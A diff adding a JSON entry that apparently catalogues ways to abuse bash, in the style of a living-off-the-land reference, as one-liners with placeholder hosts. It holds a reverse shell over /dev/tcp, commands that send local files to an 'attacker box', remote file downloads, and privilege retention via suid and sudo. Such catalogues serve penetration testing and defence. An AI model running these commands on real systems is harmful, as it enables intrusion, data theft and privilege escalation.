@@ -1,0 +1,69 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "bash"
+      }
+    ],
+    "reverse-shell": [
+      {
+        "description": "Run 'nc -l -p [port]' on the attacker box to receive the shell.",
+        "code": "bash -c 'bash -i &>/dev/tcp/[host]/[port] 0<&1'\n"
+      }
+    ],
+    "file-upload": [
+      {
+        "description": "Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.",
+        "code": "bash -c 'echo -e \"POST / HTTP/0.9\\n\\n$(<[file])\" > /dev/tcp/[host]/[port]'\n"
+      },
+      {
+        "description": "Send local file using a TCP connection. Run 'nc -l -p [port] > [file]' on the attacker box to collect the file.",
+        "code": "bash -c 'cat [file] > /dev/tcp/[host]/[port]'\n"
+      }
+    ],
+    "file-download": [
+      {
+        "description": "Fetch a remote file via HTTP GET request.",
+        "code": "export RHOST=[host]\nexport RPORT=[port]\nexport LFILE=[file]\nbash -c '{ echo -ne \"GET /$LFILE HTTP/1.0\\r\\nhost: $RHOST\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/$RHOST/$RPORT \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } > $LFILE'\n"
+      },
+      {
+        "description": "Fetch remote file using a TCP connection. Run 'nc -l -p [port] < [file]' on the attacker box to send the file.",
+        "code": "bash -c 'cat < /dev/tcp/[host]/[port] > [file]'\n"
+      }
+    ],
+    "file-write": [
+      {
+        "code": "bash -c 'echo DATA > [file]'\n"
+      },
+      {
+        "description": "This adds timestamps to the output file.",
+        "code": "HISTIGNORE='history *'\nhistory -c\nDATA\nhistory -w [file]\n"
+      }
+    ],
+    "file-read": [
+      {
+        "description": "It trims trailing newlines and it's not binary-safe.",
+        "code": "bash -c 'echo \"$(<[file])\"'\n"
+      },
+      {
+        "description": "The read file content is surrounded by the current history content.",
+        "code": "HISTTIMEFORMAT=$'\\r\\e[K'\nhistory -r [file]\nhistory\n"
+      }
+    ],
+    "library-load": [
+      {
+        "code": "bash -c 'enable -f ./lib.so x'"
+      }
+    ],
+    "suid": [
+      {
+        "code": "./bash -p"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo bash"
+      }
+    ]
+  }
+}
